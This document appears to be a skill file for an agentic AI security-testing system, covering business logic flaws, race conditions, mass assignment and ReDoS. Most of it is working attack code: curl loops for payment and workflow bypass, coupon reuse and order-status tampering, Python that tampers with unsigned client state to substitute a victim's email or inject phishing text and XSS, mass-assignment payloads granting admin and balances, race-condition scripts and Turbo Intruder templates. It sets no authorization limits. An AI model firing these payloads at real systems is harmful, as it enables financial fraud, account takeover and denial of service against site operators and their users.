---
name: logic-hunt
description: Business logic, race conditions, mass assignment, ReDoS. After DISCOVERY finds candidates — active testing, payload firing, CVE verification. Use when testing LOGIC vulnerabilities.
---

# SKILL-LOGIC-HUNT — Business Logic & State Manipulation Hunting — HUNT
# Phase Coverage: 26-28, 35
# Vuln Classes: Business Logic Flaws, Race Conditions, Mass Assignment, ReDoS
# Purpose: Hunting payloads for logic flaws, state machine abuse, and timing-based attacks

---

## Phase 26: Business Logic Flaws — CIA: I:H

### SUB-PHASE 26.2: HUNT

**Price manipulation:**
```bash
for val in -1 -0.01 0 0.001 -9999 2147483647; do
  curl -sk -X PUT "$TARGET/api/BasketItems/1" \
       -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"quantity\":$val}" | jq '{total,quantity}'
done
```

**Workflow bypass (skip payment step):**
```bash
curl -sk -X POST "$TARGET/api/Orders" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"items":[{"id":1,"quantity":1}]}' | jq .
curl -sk -X POST "$TARGET/api/checkout/confirm" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{}' | jq .
```

**Coupon reuse:**
```bash
for i in 1 2 3; do
  curl -sk -X POST "$TARGET/api/coupon/redeem" \
       -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" \
       -d '{"code":"SAVE50"}' -w " HTTP:%{http_code}"
done
```

### Logic Flaw Type 1: Workflow / Step Bypass
```bash
STEPS=(
  "$TARGET/api/checkout/confirm"
  "$TARGET/api/account/activate"
  "$TARGET/api/user/upgrade"
  "$TARGET/api/payment/complete"
  "$TARGET/api/verification/bypass"
)
for endpoint in "${STEPS[@]}"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/wf_test.txt \
       "$endpoint" -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" -d '{}')
  [[ "$S" != "4"* ]] && echo "[WORKFLOW BYPASS? — CIA:I:H] $endpoint → HTTP $S" \
    && cat /tmp/wf_test.txt | head -5
done
```

### Logic Flaw Type 2: Numeric Boundary Abuse
```bash
for price in "-0.01" "0.001" "-1e-100" "1.000000000001"; do
  curl -sk -X POST "$TARGET/api/Orders" \
       -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"items\":[{\"id\":1,\"quantity\":1,\"price\":$price}]}" | head -3
done
```

### Logic Flaw Type 3: State Machine Attacks
```bash
for status in "delivered" "completed" "refunded" "approved" "admin" "paid" "cancelled"; do
  curl -sk -X PATCH "$TARGET/api/Orders/1" \
       -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"status\":\"$status\"}" | jq .status | grep -v "null"
done
```

### Logic Flaw Type 4: Business Rule Violations via API Bypass
```bash
# Frontend enforces max 10 items - test if API enforces
curl -sk -X POST "$TARGET/api/Orders" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"items":[{"id":1,"quantity":9999}]}' | head -5

# Frontend blocks negative discount - test if server validates
curl -sk -X POST "$TARGET/api/Orders" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"discount_percent":-50}' | head -5

# Bypass payment by manipulating total
curl -sk -X POST "$TARGET/api/checkout" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"total":0.01,"items":[{"id":1,"quantity":1,"original_price":999}]}' | head -5
```

### Type 5: Unsigned Client-Side State Manipulation — HUNT

**Attack 1: Email/Identity Substitution**
```bash
python3 - << 'PYEOF'
import base64, json, requests

TARGET = "https://target.com"
ORIGINAL_B64 = "eyJlbWFpbCI6ImF0dGFja2VyQGV2aWwuY29tIiwidG9rZW4iOiJBQkMxMjMifQ=="

# Decode original
decoded = json.loads(base64.b64decode(ORIGINAL_B64 + '=='))
print(f"Original: {decoded}")

# Substitute victim email
decoded['email'] = "victim@corp.com"
# Keep attacker's token (proves session ownership)
# decoded['token'] stays the same

# Re-encode
new_b64 = base64.b64encode(json.dumps(decoded).encode()).decode().rstrip('=')
print(f"Tampered: {new_b64}")

# Test the tampered URL
r = requests.get(f"{TARGET}/verify/{new_b64}", allow_redirects=False)
print(f"Status: {r.status_code}")
print(f"Response contains victim email: {'victim@corp.com' in r.text}")
PYEOF
```

**Attack 2: UI Spoofing / Phishing on Legitimate Domain**
```bash
python3 - << 'PYEOF'
import base64, json

# Decode original state
original = json.loads(base64.b64decode(ORIGINAL_B64 + '=='))

# Inject phishing text into a rendered field
original['email'] = "victim@corp.com — SECURITY ALERT: Your account has been locked. Contact support@evil.com immediately."
original['name'] = "<script>alert('XSS')</script>"  # Test if rendered unsanitized

new_b64 = base64.b64encode(json.dumps(original).encode()).decode().rstrip('=')
print(f"PHISHING URL: {TARGET}/verify/{new_b64}")
# If the tampered text renders on the TARGET domain with valid TLS → impossible to detect via URL bar
PYEOF
```

**Attack 3: Privilege / Feature Escalation**
```bash
python3 - << 'PYEOF'
import base64, json

original = json.loads(base64.b64decode(ORIGINAL_B64 + '=='))

# Try to escalate account type
for injection in [
    {'accountType': 'enterprise', 'type': 'business'},
    {'role': 'admin', 'isAdmin': True},
    {'plan': 'premium', 'tier': 'platinum'},
    {'verified': True, 'skipPayment': True},
    {'companySize': '10000+', 'credit': 999999},
]:
    tampered = {**original, **injection}
    new_b64 = base64.b64encode(json.dumps(tampered).encode()).decode().rstrip('=')
    r = requests.get(f"{TARGET}/verify/{new_b64}", allow_redirects=False)
    print(f"Inject {injection}: HTTP {r.status_code} | {r.text[:100]}")
PYEOF
```

**Attack 4: Step Skipping**
```bash
python3 - << 'PYEOF'
import base64, json

original = json.loads(base64.b64decode(ORIGINAL_B64 + '=='))

# Skip to final step
step_injections = [
    {'step': 'complete', 'status': 'verified'},
    {'currentStep': 99, 'paymentComplete': True},
    {'onboarding_complete': True, 'kyc_verified': True},
]

for inj in step_injections:
    tampered = {**original, **inj}
    new_b64 = base64.b64encode(json.dumps(tampered).encode()).decode().rstrip('=')
    r = requests.get(f"{TARGET}/verify/{new_b64}", allow_redirects=False)
    print(f"Skip to {inj}: HTTP {r.status_code} | Location: {r.headers.get('Location','none')}")
PYEOF
```

### CHAIN OUTPUT:
  → Business logic (negative price) + checkout bypass = free items (high)
  → Coupon reuse (medium) + race-condition = infinite discount (critical)
  → Business logic bypass + mass-assignment (set total=0) = critical financial fraud
  → Unsigned client-side state + registration flow = pre-account hijacking (high)
  → Unsigned state + email substitution = victim session takeover (high)
  → Client-side state without integrity + UI spoofing = phishing on legit domain (high)

---

## Phase 27: Race Conditions (TOCTOU) — CIA: I:H

### SUB-PHASE 27.2: HUNT

**Methodology: Predict → Probe → Prove**
  → Predict: security-critical endpoints with collision potential (payments, limits, state transitions)
  → Probe: baseline sequential → parallel burst → observe response differences
  → Prove: >3 reproductions, parallel-only, scaling with parallelism, >30% success rate

**Attack Types:**
  → Single-Packet (HTTP/2): bundle requests in one TCP packet, ~1ms spread
  → First Sequence Sync: IP fragmentation + TCP reorder, 10,000+ requests in 166ms
  → Multi-Endpoint: different endpoints, same shared resource
  → WebSocket: parallel WS messages across connections
  → Partial Construction: race during object creation
  → TOCTOU: state checked at T1 ≠ state used at T2

**Clues (parallel vs sequential differences):**
  → Different response bodies/status codes
  → Same token/OTP returned for simultaneous resets
  → Coupon accepted multiple times
  → Balance updates don't match transaction count
  → One succeeds while another gets unexpected error

Async race script template:
```python
#!/usr/bin/env python3
import asyncio, httpx, sys, json

TARGET   = sys.argv[1]
TOKEN    = sys.argv[2]
ENDPOINT = sys.argv[3]
PAYLOAD  = json.loads(sys.argv[4]) if len(sys.argv) > 4 else {}
N        = int(sys.argv[5]) if len(sys.argv) > 5 else 25

results = []

async def send(client, tid):
    try:
        r = await client.post(
            f"{TARGET}{ENDPOINT}",
            headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"},
            json=PAYLOAD, timeout=15
        )
        results.append((tid, r.status_code, r.text[:150]))
    except Exception as e:
        results.append((tid, "ERR", str(e)[:60]))

async def main():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [send(client, i) for i in range(N)]
        await asyncio.gather(*tasks)
    success = [r for r in results if str(r[1]).startswith("2")]
    codes   = sorted(set(str(r[1]) for r in results))
    print(f"Results: {len(success)}/{N} success | Codes: {', '.join(codes)}")
    if len(success) > 1:
        print(f"[RACE CONDITION — CIA:I:H] {len(success)} parallel successes")
        for r in success[:5]: print(f"  Thread {r[0]}: {r[2]}")

asyncio.run(main())
```

Usage:
```bash
python3 race_condition.py "$TARGET" "$USER1_TOKEN" "/api/coupon/redeem" '{"code":"SAVE50"}' 25
```

**Turbo Intruder — Single-Packet (HTTP/2):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10, engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Turbo Intruder — Last-Byte Sync (HTTP/1.1):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30,
                           requestsPerConnection=30, pipeline=False)
    for i in range(30):
        engine.queue(target.req[:-1], gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

**Turbo Intruder — Connection Warming + Attack:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, engine=Engine.BURP2)
    for i in range(5): engine.queue(target.req)  # warmup
    for i in range(50): engine.queue(target.req, gate='race1')  # attack
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Response Patterns:**
  → 200 + 200 (both success) = limit overrun, TOCTOU confirmed
  → 200 + 403 (one fails) = partial race, increase parallelism
  → 200 + 500 (one errors) = DB constraint violation, strong indicator
  → Same token in both = token collision, ATO potential
  → Different balances = double-spending, financial impact

### CHAIN OUTPUT:
  → Race condition (medium) + coupon = unlimited discount (high)
  → Race condition + withdrawal = double-spend (critical financial)
  → Race condition + 2FA = bypass 2FA timing window (critical)
  → Race + ATO = full account compromise (critical)
  → Race + privilege escalation = data exfiltration (critical)

---

## Phase 28: Mass Assignment — CIA: I:H

### SUB-PHASE 28.2: HUNT

**Registration endpoint - inject privileged fields:**
```bash
for payload in \
  '{"email":"a@t.com","password":"Pass1!","role":"admin","isAdmin":true}' \
  '{"email":"b@t.com","password":"Pass1!","privilege":99,"verified":true}' \
  '{"email":"c@t.com","password":"Pass1!","credits":999999,"balance":99999}'; do
  RESP=$(curl -sk -X POST "$TARGET/api/register" \
         -H "Content-Type: application/json" -d "$payload" | jq '{role,isAdmin,privilege,credits}')
  echo "$RESP" | grep -v "null" && echo "[MASS ASSIGNMENT — CIA:I:H] $payload"
done
```

**Profile update endpoint - inject extra fields:**
```bash
curl -sk -X PUT "$TARGET/api/account/profile" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"username":"normal","role":"admin","isAdmin":true,"subscription":"premium","balance":99999}' \
     | jq .
```

### CHAIN OUTPUT:
  → Mass assignment → role:admin (high) + IDOR = full admin control (critical)
  → Mass assignment → balance:99999 = financial fraud (critical)
  → Mass assignment → verified:true = bypass email verification (high)

---

## Phase 35: ReDoS — Regular Expression DoS — CIA: A:M

### SUB-PHASE 35.2: HUNT

**Vulnerable patterns: (a+)+ | ([a-zA-Z]+)* | (a|aa)+ | (.*a){n}**
```bash
python3 - << 'EOF'
import re, time
tests = [
    (r'^(a+)+$',       'a'*50+'X'),
    (r'^([a-z]+)*$',   'a'*40+'!'),
    (r'(a|aa)+$',      'a'*35+'X'),
]
for pattern, test in tests:
    start = time.time()
    try: re.match(pattern, test)
    except: pass
    elapsed = time.time()-start
    print(f"{'VULNERABLE' if elapsed>2 else 'OK'}: {pattern[:40]} | {elapsed:.2f}s")
EOF

T=$(curl -sk -o /dev/null -w "%{time_total}" -X POST "$TARGET/api/validate" \
     -H "Content-Type: application/json" \
     -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX@a.com"}')
python3 -c "t=float('$T'); exit(0 if t<4 else 1)" \
  || echo "[REDOS — CIA:A:M] Endpoint hangs on crafted input - ${T}s"
```

### CHAIN OUTPUT:
  → ReDoS (low by itself) + business logic endpoint = DoS on payment processing (high)
  → NOTE: Report potential only - never repeatedly trigger in production

---

*SKILL-LOGIC-HUNT — Part of the acy Agentic Security Research System v3.0*
